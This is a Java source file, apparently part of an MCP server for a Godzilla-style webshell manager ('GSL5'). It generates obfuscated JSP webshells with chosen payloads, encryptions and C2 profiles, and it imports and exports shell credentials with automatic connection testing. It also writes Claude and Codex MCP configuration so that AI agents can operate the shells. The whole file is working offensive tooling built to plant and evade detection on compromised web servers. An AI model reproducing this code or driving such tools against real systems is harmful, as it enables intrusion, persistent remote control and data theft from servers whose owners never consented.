    private static String joinTab(Vector<String> cells) {
        if (cells == null || cells.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < cells.size(); i++) {
            if (i > 0) sb.append('\t');
            String v = cells.get(i);
            sb.append(v == null ? "" : v.replace('\t', ' ').replace('\n', ' '));
        }
        return sb.toString();
    }

    private String formatDbInfo(DbInfo info) {
        StringBuilder sb = new StringBuilder();
        sb.append("configName=").append(nvl(info.getConfigName())).append("\n");
        sb.append("dbType=").append(nvl(info.getDatabaseType())).append("\n");
        sb.append("host=").append(nvl(info.getHost())).append("\n");
        sb.append("port=").append(info.getPort()).append("\n");
        sb.append("dbName=").append(nvl(info.getCurrentDatabase())).append("\n");
        sb.append("user=").append(nvl(info.getUsername())).append("\n");
        sb.append("charset=").append(nvl(info.getDatabaseCharset())).append("\n");
        sb.append("driver=").append(nvl(info.getDatabaseDrive())).append("\n");
        return sb.toString();
    }

    private static String dbNeedConfigHint(ShellEntity sh) {
        String[] configs = sh.listDatabaseConfigs();
        if (configs != null && configs.length > 1) {
            return "\u8bf7\u4f20 configName \u6216 dbType/dbHost\u3002\u5df2\u4fdd\u5b58: " + String.join(", ", configs);
        }
        return "\u8bf7\u4f20 configName(\u5148 db_configs list)\u6216 dbType/dbHost/dbUser/dbPass";
    }

    private static String inferExecType(String sql, String execType) {
        if (!isBlank(execType)) return execType.trim();
        if (sql == null) return "select";
        String low = sql.trim().toLowerCase();
        if (low.startsWith("select") || low.startsWith("show") || low.startsWith("desc")
                || low.startsWith("describe") || low.startsWith("explain") || low.startsWith("pragma")
                || low.startsWith("with") || low.startsWith("values")) {
            return "select";
        }
        return "update";
    }

    private static int defaultDbPort(String type) {
        if (type == null) return 3306;
        switch (type.toLowerCase()) {
            case "sqlserver": return 1433;
            case "oracle": return 1521;
            case "postgresql": return 5432;
            case "sqlite": return 0;
            default: return 3306;
        }
    }

    private static boolean isBlank(Object o) {
        if (o == null) return true;
        String s = String.valueOf(o).trim();
        return s.isEmpty() || "null".equalsIgnoreCase(s);
    }

    private static String strArg(Object o) {
        return o == null ? null : String.valueOf(o).trim();
    }

    private static String nvl(String s) {
        return s == null ? "" : s;
    }

    private static String firstNonBlank(String... vals) {
        if (vals == null) return null;
        for (String v : vals) {
            if (!isBlank(v)) return v;
        }
        return null;
    }

    // --- Payloads ---
    private String payloadList() {
        StringBuilder sb = new StringBuilder();
        for (String pn : ApplicationContext.getAllPayload()) {
            sb.append("Payload: ").append(pn).append("\n");
            for (String cn : ApplicationContext.getAllCryption(pn)) {
                sb.append("  Cryption: ").append(cn).append("\n");
            }
        }
        return sb.toString();
    }

    // --- C2 Profile ---
    private String c2profileList(Map<String, Object> a) {
        String payload = (String) a.get("payload");
        String[] profiles = payload != null ? ApplicationContext.listC2Profile(payload) : ApplicationContext.listC2Profile();
        return profiles.length > 0 ? String.join("\n", profiles) : "\u65e0 C2 \u914d\u7f6e";
    }

    private String c2profileGet(Map<String, Object> a) {
        String content = ApplicationContext.getC2Profile((String) a.get("name"));
        return content != null ? content : "\u672a\u627e\u5230";
    }

    // --- Shell Env ---
    private String shellEnv(Map<String, Object> a) {
        ShellEntity sh = getShell(a);
        String action = (String) a.getOrDefault("action", "get");
        String key = (String) a.get("key");
        switch (action) {
            case "get": return sh.getEnv(key, "");
            case "set": return sh.setEnv(key, (String) a.get("value")) ? "\u8bbe\u7f6e\u6210\u529f" : "\u8bbe\u7f6e\u5931\u8d25";
            case "del": return sh.removeEnv(key) ? "\u5220\u9664\u6210\u529f" : "\u5220\u9664\u5931\u8d25";
            case "list": return "ERR_RETRY_NUM, onceBigFileDownloadByteNum, onceBigFileUploadByteNum, bigFileDownloadThreadNum, mergeResponseCookie, clientCertPath, clientCertPassword, c2Profile, ENV_GROUP_ID, DatabaseConfig_*";
            default: return "\u672a\u77e5\u64cd\u4f5c: " + action;
        }
    }

    // Fuzzy match cryption name (case-insensitive, ignore _ - space)
    private String resolveCryption(String payload, String input) {
        String norm = input.toLowerCase().replaceAll("[_\\-\\s]", "");
        for (String cn : ApplicationContext.getAllCryption(payload)) {
            if (cn.toLowerCase().replaceAll("[_\\-\\s]", "").equals(norm)) return cn;
        }
        for (String cn : ApplicationContext.getAllCryption(payload)) {
            if (cn.toLowerCase().replaceAll("[_\\-\\s]", "").contains(norm) ||
                norm.contains(cn.toLowerCase().replaceAll("[_\\-\\s]", ""))) return cn;
        }
        return null;
    }

    // --- One-step Create Shell + Generate File ---
    private String shellCreate(Map<String, Object> a) {
        String url = (String) a.getOrDefault("url", "http://127.0.0.1:8080/shell.jsp");
        String password = (String) a.getOrDefault("password", "pass");
        String secretKey = (String) a.getOrDefault("secretKey", "key");
        String payloadRaw = (String) a.getOrDefault("payload", "JavaDynamicPayload");
        // Fuzzy match payload name
        String payload = null;
        String normPl = payloadRaw.toLowerCase().replaceAll("[_\\-\\s]", "");
        for (String pn : ApplicationContext.getAllPayload()) {
            if (pn.toLowerCase().replaceAll("[_\\-\\s]", "").equals(normPl)) { payload = pn; break; }
        }
        if (payload == null) {
            for (String pn : ApplicationContext.getAllPayload()) {
                if (pn.toLowerCase().replaceAll("[_\\-\\s]", "").contains(normPl)) { payload = pn; break; }
            }
        }
        if (payload == null) payload = "JavaDynamicPayload";
        String cryptionRaw = (String) a.get("cryption");
        String genFile = (String) a.get("genFile");
        String obfLevel = (String) a.getOrDefault("obfuscation", "default");
        if (cryptionRaw == null || genFile == null)
            return "\u7f3a\u5c11\u5fc5\u586b\u53c2\u6570\u3002\u5fc5\u586b: cryption, genFile";
        if (!"default".equals(obfLevel)) { Db.updateSetingKV("godMode", obfLevel); }
        // Fuzzy match cryption name (user may say aesbase64/java_c2/gzip etc.)
        String cryption = resolveCryption(payload, cryptionRaw);
        if (cryption == null) {
            StringBuilder avail = new StringBuilder("\u672a\u627e\u5230\u52a0\u5bc6\u5668: " + cryptionRaw + "\n\u53ef\u7528\u52a0\u5bc6\u5668:\n");
            for (String cn : ApplicationContext.getAllCryption(payload)) avail.append("  ").append(cn).append("\n");
            return avail.toString();
        }
        // MCP: programmatic processor selection - never pop ChooseProcessor/ChooseEscapes dialogs.
        String obf = obfLevel == null ? "default" : obfLevel.toLowerCase();
        if (obf.startsWith("super")) {
            core.shellprocessor.StartProcessor.setAutoProcessor("JspEscapesProcessor");
            core.shellprocessor.jspescapes.JspEscapesProcessor.EscapesOptions autoOpts =
                    new core.shellprocessor.jspescapes.JspEscapesProcessor.EscapesOptions();
            autoOpts.EncodingMethod = "关闭";
            autoOpts.isEncodingHeader = true;
            autoOpts.isAppendLitter = false;
            autoOpts.isDoubleConfusion = false;
            autoOpts.isRandomConfusion = false;
            autoOpts.minLitterNumber = 2;
            autoOpts.maxLitterNumber = 5;
            // superObfuscation=十进制 | superUnicode=unicode 转义 | superHex=十六进制
            // superXml=CDATA 逐字符 | superRandom=随机模式 | superDouble=双重混淆(先 unicode 再随机)
            if (obf.equals("superunicode")) { autoOpts.escapeMethod = "escapesUnicode"; }
            else if (obf.equals("superhex")) { autoOpts.escapeMethod = "escapesHex"; }
            else if (obf.equals("superxml")) { autoOpts.escapeMethod = "escapesXmlLabel"; }
            else if (obf.equals("superrandom")) { autoOpts.isRandomConfusion = true; }
            else if (obf.equals("superdouble")) { autoOpts.isDoubleConfusion = true; autoOpts.isRandomConfusion = true; }
            else { autoOpts.escapeMethod = "escapesDecimal"; }
            core.shellprocessor.jspescapes.JspEscapesProcessor.setAutoOptions(autoOpts);
        } else {
            core.shellprocessor.StartProcessor.setAutoProcessor("none");
        }
        // Build ShellEntity
        ShellEntity sh = new ShellEntity();
        sh.setId(UUID.randomUUID().toString());
        sh.setUrl(url); sh.setPassword(password); sh.setSecretKey(secretKey);
        sh.setPayload(payload); sh.setCryption(cryption);
        sh.setEncoding(safeEncoding((String) a.getOrDefault("encoding", "Auto")));
        try {
            Object cryptionObj = ApplicationContext.getCryption(payload, cryption);
            if (cryptionObj == null) return "\u672a\u627e\u5230\u52a0\u5bc6\u5668: " + cryption;
            // Detect if this is a C2 cryption (has 3-arg generate with C2ProfileContext)
            boolean isC2 = false;
            try { cryptionObj.getClass().getMethod("generate", String.class, String.class, C2ProfileContext.class); isC2 = true; } catch (NoSuchMethodException e) {}
            String c2Profile = null;
            if (isC2) {
                c2Profile = (String) a.get("c2Profile");
                if (c2Profile == null || c2Profile.isEmpty()) {
                    String[] allProfiles = ApplicationContext.listC2Profile(payload);
                    if (allProfiles.length > 0) c2Profile = allProfiles[0];
                }
            }
            byte[] shellBytes;
            if (isC2 && c2Profile != null && !c2Profile.isEmpty()) {
                // C2 cryption: bypass 3-arg generate() which has hardcoded UI dialogs.
                // Instead directly load template and call generate() ourselves.
                Object ctx = C2ProfileLoader.loadC2Profile(ApplicationContext.getC2Profile(c2Profile), payload); // content + payload
                Object c2ProfileCtx = ctx.getClass().getMethod("getC2ProfileContext").invoke(ctx);
                java.lang.reflect.Method listTpl = C2ProfileContext.class.getMethod("listC2ProfileTemplate", String.class);
                java.util.LinkedList<?> templates = (java.util.LinkedList<?>) listTpl.invoke(c2ProfileCtx, payload);
                if (templates.isEmpty()) return "C2Profile \u4e2d\u6ca1\u6709\u53ef\u7528\u6a21\u677f";
                // Pick first template, use "jsp" suffix
                Class<?> tplClass = (Class<?>) templates.get(0);
                java.lang.reflect.Constructor<?> ctor = tplClass.getConstructor(C2ProfileContext.class, String.class, String.class, java.util.HashMap.class);
                Object template = ctor.newInstance(c2ProfileCtx, payload, "jsp", new java.util.HashMap<>());
                shellBytes = (byte[]) template.getClass().getMethod("generate").invoke(template);
                // Apply template preprocessor (e.g. jsp -> escape special chars)
                shellBytes = core.shellprocessor.StartProcessor.process(shellBytes, "jsp");
            } else {
                // Non-C2 cryption: set suffix field directly (skip init to avoid connection), then generate()
                try {
                    java.lang.reflect.Field sf = cryptionObj.getClass().getDeclaredField("suffix");
                    sf.setAccessible(true);
                    String curSuffix = (String) sf.get(cryptionObj);
                    if (curSuffix == null || curSuffix.isEmpty()) { sf.set(cryptionObj, "jsp"); }
                } catch (Exception ign) {}
                java.lang.reflect.Method gen2 = cryptionObj.getClass().getMethod("generate", String.class, String.class);
                shellBytes = (byte[]) gen2.invoke(cryptionObj, password, secretKey);
            }
            if (shellBytes == null || shellBytes.length == 0) return "\u751f\u6210\u5931\u8d25: \u7a7a\u6587\u4ef6";
            java.nio.file.Files.write(java.nio.file.Paths.get(genFile), shellBytes);
            return "\u751f\u6210\u6210\u529f! \u6587\u4ef6: " + genFile + " (" + shellBytes.length + " bytes)"
                + " | URL: " + url + " | Payload: " + payload + " | Cryption: " + cryption
                + " | Obfuscation: " + obfLevel + " | C2Profile: " + (c2Profile != null ? c2Profile : "\u65e0");
        } catch (Exception ex) { return "\u751f\u6210\u5931\u8d25: " + ex.getMessage(); }
        finally {
            core.shellprocessor.StartProcessor.clearAutoProcessor();
            core.shellprocessor.jspescapes.JspEscapesProcessor.clearAutoOptions();
        }
    }

    // --- Export/Import ---
    private String shellExport(Map<String, Object> a) {
        StringBuilder sb = new StringBuilder();
        if (a.containsKey("shellId")) {
            ShellEntity sh = Db.getOneShell((String) a.get("shellId"));
            if (sh == null) return "\u672a\u627e\u5230 Shell";
            sb.append(serializeShell(sh));
        } else {
            Vector<Vector<String>> rows = Db.getAllShell();
            if (rows.size() > 1) rows.remove(0);
            for (Vector<String> row : rows) {
                ShellEntity sh = Db.getOneShell(row.get(0));
                if (sh != null) sb.append(serializeShell(sh)).append("");
            }
        }
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            java.util.zip.GZIPOutputStream gzos = new java.util.zip.GZIPOutputStream(bos);
            gzos.write(sb.toString().getBytes(StandardCharsets.UTF_8));
            gzos.close();
            return "gsl5://import?data=" + Base64.getUrlEncoder().withoutPadding().encodeToString(bos.toByteArray());
        } catch (Exception e) { return "\u5bfc\u51fa\u5931\u8d25: " + e.getMessage(); }
    }

    private String shellImport(Map<String, Object> a) {
        String link = (String) a.get("link");
        if (!link.startsWith("gsl5://import?data=")) return "\u65e0\u6548\u94fe\u63a5";
        try {
            byte[] compressed = Base64.getUrlDecoder().decode(link.substring("gsl5://import?data=".length()));
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(compressed);
            java.util.zip.GZIPInputStream gzis = new java.util.zip.GZIPInputStream(bis);
            byte[] raw = functions.readInputStream(gzis); gzis.close();
            String data = new String(raw, StandardCharsets.UTF_8);
            String[] records = data.split("\\u0002", -1);
            int added = 0;
            StringBuilder result = new StringBuilder();
            for (String rec : records) {
                if (rec.trim().isEmpty()) continue;
                String[] f = rec.split("\\u0001", -1);
                if (f.length < 24) continue;
                ShellEntity sh = new ShellEntity();
                sh.setId(UUID.randomUUID().toString());
                sh.setUrl(dec(f[0])); sh.setPassword(dec(f[1])); sh.setSecretKey(dec(f[2]));
                sh.setPayload(dec(f[3])); sh.setCryption(dec(f[4])); String enc = dec(f[5]); if (enc != null && !enc.trim().isEmpty()) sh.setEncoding(enc);
                sh.setHeader(dec(f[6])); sh.setReqLeft(dec(f[7])); sh.setReqRight(dec(f[8]));
                try { sh.setConnTimeout(Integer.parseInt(f[9])); } catch (Exception e) {}
                try { sh.setReadTimeout(Integer.parseInt(f[10])); } catch (Exception e) {}
                sh.setProxyType(dec(f[11])); sh.setProxyHost(dec(f[12]));
                try { sh.setProxyPort(Integer.parseInt(f[13])); } catch (Exception e) {}
                sh.setRemark(dec(f[14])); sh.setC2ProfileName(dec(f[15]));
                if (Db.addShell(sh) > 0) {
                    try { sh.setMaxErrRetry(Integer.parseInt(f[16])); } catch (Exception e) {}
                    try { sh.setOnceBigFileDownloadByteNum(Integer.parseInt(f[17])); } catch (Exception e) {}
                    try { sh.setOnceBigFileUploadByteNum(Integer.parseInt(f[18])); } catch (Exception e) {}
                    try { sh.setBigFileDownloadThreadNum(Integer.parseInt(f[19])); } catch (Exception e) {}
                    try { sh.setMergeResponseCookie(Boolean.parseBoolean(f[20])); } catch (Exception e) {}
                    sh.setClientCertPath(dec(f[21])); sh.setClientCertPassword(dec(f[22]));
                    if (f.length>23 && !dec(f[23]).isEmpty()) sh.setGroup(dec(f[23]));
                    String cp = sh.getC2ProfileName();
                    if (cp != null && !cp.isEmpty()) sh.setC2ProfileName2(cp);
                    // Auto-test connection after import
                    String connStatus = "\u672a\u6d4b\u8bd5";
                    try {
                        if (sh.initShellOpertion()) {
                            connStatus = "\u8fde\u63a5\u6210\u529f";
                            if (sh.getPayloadModule() != null) {
                                String info = sh.getPayloadModule().getBasicsInfo();
                                if (info != null && !info.isEmpty()) {
                                    connStatus += " | " + info.replace("\n", " | ");
                                }
                            }
                        } else {
                            connStatus = "\u8fde\u63a5\u5931\u8d25";
                        }
                    } catch (Exception ex) { connStatus = "\u8fde\u63a5\u5f02\u5e38: " + ex.getMessage(); }
                    result.append("Shell ID: ").append(sh.getId())
                          .append(" | URL: ").append(sh.getUrl())
                          .append(" | Payload: ").append(sh.getPayload())
                          .append(" | Status: ").append(connStatus).append("\n");
                    added++;
                }
            }
            return "\u5bfc\u5165\u5b8c\u6210! \u6210\u529f: " + added + " \u6761\n\n" + result.toString();
        } catch (Exception e) { return "\u5bfc\u5165\u5931\u8d25: " + e.getMessage(); }
    }

    // --- Settings ---
    private String settingsGet(Map<String, Object> a) {
        if (a.containsKey("key")) {
            String val = Db.getSetingValue((String) a.get("key"));
            return val != null ? val : "(null)";
        }
        StringBuilder sb = new StringBuilder();
        for (String k : new String[]{"godMode","shellOpenCache","ui-resourceName","ui-lafClassName",
            "font-name","font-type","font-size","bigFileErrorRetryNum","FileExtPixel"}) {
            String v = Db.getSetingValue(k);
            sb.append(k).append(" = ").append(v != null ? v : "(null)").append("\n");
        }
        return sb.toString();
    }

    private String settingsSet(Map<String, Object> a) {
        return Db.updateSetingKV((String) a.get("key"), (String) a.get("value")) ? "\u8bbe\u7f6e\u6210\u529f" : "\u8bbe\u7f6e\u5931\u8d25";
    }

    // ==================== Config File ====================
    private String configRead(Map<String, Object> a) {
        try { return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("config.yaml")), StandardCharsets.UTF_8); }
        catch (Exception e) { return "\u8bfb\u53d6\u5931\u8d25: " + e.getMessage(); }
    }

    private String configWrite(Map<String, Object> a) {
        try { java.nio.file.Files.write(java.nio.file.Paths.get("config.yaml"), ((String)a.get("content")).getBytes(StandardCharsets.UTF_8)); return "\u5199\u5165\u6210\u529f"; }
        catch (Exception e) { return "\u5199\u5165\u5931\u8d25: " + e.getMessage(); }
    }

    private String oplogQuery(Map<String, Object> a) {
        int limit = toInt(a.get("limit"), 50);
        String actionFilter = (String) a.get("action");
        StringBuilder sb = new StringBuilder();
        try {
            java.lang.reflect.Field f = Db.class.getDeclaredField("dbConn");
            f.setAccessible(true); java.sql.Connection c = (java.sql.Connection) f.get(null);
            if (c == null) return "\u6570\u636e\u5e93\u672a\u8fde\u63a5";
            String sql = "SELECT username, shell_id, action, detail, create_time FROM operation_log";
            if (actionFilter != null && !actionFilter.isEmpty()) sql += " WHERE action LIKE ?";
            sql += " ORDER BY create_time DESC LIMIT " + Math.min(limit, 500);
            java.sql.PreparedStatement ps = c.prepareStatement(sql);
            if (actionFilter != null && !actionFilter.isEmpty()) ps.setString(1, "%" + actionFilter + "%");
            java.sql.ResultSet rs = ps.executeQuery();
            while (rs.next()) {
                sb.append("[").append(rs.getString(5)).append("] ").append(rs.getString(1)).append(" | ").append(rs.getString(3)).append(" | ").append(rs.getString(4)).append("\n");
            }
            ps.close();
        } catch (Exception ex) { return "\u67e5\u8be2\u5931\u8d25: " + ex.getMessage(); }
        return sb.length() > 0 ? sb.toString() : "\u65e0\u64cd\u4f5c\u65e5\u5fd7";
    }

    private String shellBackup(Map<String, Object> a) {
        String genFile = (String) a.getOrDefault("genFile", "shell_backup.txt");
        try {
            Vector<Vector<String>> rows = Db.getAllShell();
            if (rows.size() <= 1) return "\u65e0 Shell \u53ef\u5907\u4efd";
            rows.remove(0); StringBuilder sb = new StringBuilder();
            for (Vector<String> row : rows) {
                sb.append(row.get(0)).append(" | ").append(row.size()>1?row.get(1):"").append(" | ").append(row.size()>4?row.get(4):"").append(" | ").append(row.size()>5?row.get(5):"").append("\n");
            }
            java.nio.file.Files.write(java.nio.file.Paths.get(genFile), sb.toString().getBytes(StandardCharsets.UTF_8));
            return "\u5df2\u5907\u4efd " + rows.size() + " \u4e2a Shell \u5230 " + genFile;
        } catch (Exception ex) { return "\u5907\u4efd\u5931\u8d25: " + ex.getMessage(); }
    }

    private String mcpStatus(Map<String, Object> a) {
        int shellCount = Db.getAllShell().size() - 1;
        ensureAuthToken();
        StringBuilder sb = new StringBuilder();
        sb.append("GSL5 MCP Server\n");
        sb.append("  \u72b6\u6001: ").append(running ? "\u8fd0\u884c\u4e2d" : "\u5df2\u505c\u6b62").append("\n");
        sb.append("  \u7ed1\u5b9a: ").append(bindHost).append(":").append(port).append("\n");
        sb.append("  Auth: ").append(authToken != null && !authToken.isEmpty() ? ("token " + maskToken(authToken)) : "off").append("\n");
        sb.append("  Header: Authorization: Bearer <token>\n");
        sb.append("  \u63a8\u8350: http://").append(preferredAccessHost()).append(":").append(port).append("/sse\n");
        sb.append("  \u53ef\u8bbf\u95ee:\n");
        for (String u : listAccessUrls()) sb.append("    ").append(u).append("/sse\n");
        sb.append("  SSE \u5ba2\u6237\u7aef: ").append(sseSessions.size()).append("\n");
        sb.append("  Shell \u603b\u6570: ").append(Math.max(0, shellCount)).append("\n");
        sb.append("  DB \u6a21\u5f0f: ").append(core.ui.MainActivity.isRemoteDb ? "\u8fdc\u7a0b PostgreSQL" : "\u672c\u5730 SQLite");
        return sb.toString();
    }

    private String mcpConfig(Map<String, Object> a) {
        String host = preferredAccessHost();
        String client = "claude";
        boolean doWrite = false;
        if (a != null) {
            if (a.get("host") != null) {
                String h = String.valueOf(a.get("host")).trim();
                if (!h.isEmpty() && !"auto".equalsIgnoreCase(h)) host = h;
            }
            if (a.get("client") != null) {
                String c = String.valueOf(a.get("client")).trim().toLowerCase();
                if (!c.isEmpty()) client = c;
            }
            if (a.get("write") != null) {
                String w = String.valueOf(a.get("write")).trim().toLowerCase();
                doWrite = "1".equals(w) || "true".equals(w) || "yes".equals(w) || "on".equals(w);
            }
        }
        ensureAuthToken();
        StringBuilder extra = new StringBuilder();
        extra.append("bind=").append(bindHost).append(":").append(port).append("\n");
        extra.append("config host=").append(host).append("\n");
        extra.append("client=").append(client).append("\n");
        extra.append("auth=").append(authToken != null && !authToken.isEmpty() ? ("token " + maskToken(authToken)) : "off").append("\n");
        extra.append("all access URLs:\n");
        for (String u : listAccessUrls()) extra.append("  ").append(u).append("/sse\n");
        extra.append("\n");

        StringBuilder body = new StringBuilder();
        if ("codex".equals(client) || "openai".equals(client)) {
            body.append("--- Codex TOML ---\n").append(buildCodexToml(host)).append("\n");
            if (doWrite) body.append(doWriteCodexConfig(true)).append("\n");
        } else if ("all".equals(client) || "both".equals(client)) {
            body.append("--- Claude JSON ---\n").append(buildMcpJson(host)).append("\n");
            body.append("--- Codex TOML ---\n").append(buildCodexToml(host)).append("\n");
            if (doWrite) {
                body.append(doWriteClaudeConfigs(true)).append("\n");
                body.append(doWriteCodexConfig(true)).append("\n");
            }
        } else {
            // claude default
            body.append("--- Claude JSON ---\n").append(buildMcpJson(host)).append("\n");
            if (doWrite) body.append(doWriteClaudeConfigs(true)).append("\n");
        }

        if (a != null && a.get("outputPath") != null) {
            String outPath = String.valueOf(a.get("outputPath"));
            try {
                String content;
                if ("codex".equals(client) || "openai".equals(client)) content = buildCodexToml(host);
                else if ("all".equals(client) || "both".equals(client)) content = buildMcpJson(host) + "\n\n" + buildCodexToml(host);
                else content = buildMcpJson(host);
                Files.write(Paths.get(outPath), content.getBytes(StandardCharsets.UTF_8));
                return "\u5df2\u5199\u5165: " + outPath + "\n" + extra + body;
            } catch (Exception e) {
                return "\u5199\u5165\u5931\u8d25: " + e.getMessage() + "\n\n" + extra + body;
            }
        }
        if (!doWrite) {
            extra.append("\u63d0\u793a: write=true \u53ef\u5199\u5165\u672c\u673a\u9ed8\u8ba4 Claude/Codex \u914d\u7f6e\u8def\u5f84; client=claude|codex|all\n\n");
        }
        return extra + body.toString();
    }
    class ConfigHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            if ("OPTIONS".equals(ex.getRequestMethod())) {
                ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
                ex.getResponseHeaders().set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-MCP-Token");
                sendJson(ex, 200, "{}");
                return;
            }
            if (!requireAuth(ex)) return;
            if ("GET".equals(ex.getRequestMethod())) {
                String content = configRead(null);
                sendJson(ex, 200, j("content", content));
            } else {
                byte[] bodyBytes = functions.readInputStream(ex.getRequestBody());
                String body = new String(bodyBytes, StandardCharsets.UTF_8);
                java.nio.file.Files.write(java.nio.file.Paths.get("config.yaml"), body.getBytes(StandardCharsets.UTF_8));
                sendJson(ex, 200, j("status","ok","message","\u5199\u5165\u6210\u529f"));
            }
        }
    }

    // ==================== Serialization ====================
    private String serializeShell(ShellEntity sh) {
        return enc(sh.getUrl())+""+enc(sh.getPassword())+""+enc(sh.getSecretKey())+""
            +enc(sh.getPayload())+""+enc(sh.getCryption())+""+enc(sh.getEncoding())+""
            +enc(sh.getHeaderS())+""+enc(sh.getReqLeft())+""+enc(sh.getReqRight())+""
            +sh.getConnTimeout()+""+sh.getReadTimeout()+""
            +enc(sh.getProxyType())+""+enc(sh.getProxyHost())+""+sh.getProxyPort()+""
            +enc(sh.getRemark())+""+enc(sh.getC2ProfileName()!=null?sh.getC2ProfileName():"")+""
            +sh.getMaxErrRetry()+""+sh.getOnceBigFileDownloadByteNum()+""+sh.getOnceBigFileUploadByteNum()+""
            +sh.getBigFileDownloadThreadNum()+""+sh.isMergeResponseCookie()+""
            +enc(sh.getClientCertPath())+""+enc(sh.getClientCertPassword())+""+enc(sh.getGroup());
    }
    private static String enc(String v) {
        if (v == null) return "";
        try { return java.net.URLEncoder.encode(v, "UTF-8"); } catch (Exception e) { return v; }
    }
    private static String dec(String v) {
        if (v == null || v.isEmpty()) return "";
        try { return java.net.URLDecoder.decode(v, "UTF-8"); } catch (Exception e) { return v; }
    }

    // ==================== JSON Builder ====================
    private static String j(Object... kv) {
        StringBuilder sb = new StringBuilder("{");
        for (int i = 0; i < kv.length; i += 2) { if (i>0)sb.append(","); sb.append("\"").append(kv[i]).append("\":").append(toJson(kv[i+1])); }
        return sb.append("}").toString();
    }
    private static String m(Object... kv) {
        StringBuilder sb = new StringBuilder("{");
        for (int i = 0; i < kv.length; i += 2) { if (i>0)sb.append(","); sb.append("\"").append(kv[i]).append("\":").append(toJson(kv[i+1])); }
        return sb.append("}").toString();
    }
    private static String a(Object... items) {
        StringBuilder sb = new StringBuilder("[");
        for (int i = 0; i < items.length; i++) { if (i>0)sb.append(","); sb.append(toJson(items[i])); }
        return sb.append("]").toString();
    }
    private static String t(String name, String desc, String inputSchema) {
        return "{\"name\":\""+esc(name)+"\",\"description\":\""+esc(desc)+"\",\"inputSchema\":"+inputSchema+"}";
    }
    private static String p(Object... kv) {
        StringBuilder props = new StringBuilder("{");
        StringBuilder required = new StringBuilder();
        for (int i = 0; i < kv.length; i += 2) {
            String k = (String) kv[i];
            Object v = kv[i+1];
            if (v instanceof String && ((String)v).startsWith("\u5fc5")) {
                if (required.length()>0) required.append(",");
                required.append("\"").append(k).append("\"");
                props.append("\"").append(k).append("\":{\"type\":\"string\",\"description\":\"").append(esc((String)v)).append("\"}");
            } else if (v instanceof String) {
                props.append("\"").append(k).append("\":{\"type\":\"string\",\"description\":\"").append(esc((String)v)).append("\"}");
            } else {
                props.append("\"").append(k).append("\":").append(toJson(v));
            }
            if (i+2 < kv.length) props.append(",");
        }
        props.append("}");
        String reqStr = required.length()>0 ? ",\"required\":["+required+"]" : "";
        return "{\"type\":\"object\",\"properties\":"+props+reqStr+"}";
    }
    private static String s(String desc) { return desc; }
    private static String i() { return "{\"type\":\"integer\",\"description\":\"\"}"; }

    private static String toJson(Object v) {
        if (v == null) return "null";
        if (v instanceof Boolean) return v.toString();
        if (v instanceof Number) return v.toString();
        if (v instanceof String) {
            String s = (String) v;
            if (s.startsWith("{") || s.startsWith("[")) return s;
            return "\"" + esc(s) + "\"";
        }
        return "\"" + esc(v.toString()) + "\"";
    }
    private static String esc(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder(s.length()+8);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"': sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default: sb.append(c);
            }
        }
        return sb.toString();
    }
    private static void sendJson(HttpExchange ex, int code, String json) throws IOException {
        byte[] bytes = json.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "application/json; charset=utf-8");
        ex.sendResponseHeaders(code, bytes.length);
        ex.getResponseBody().write(bytes);
        ex.close();
    }
}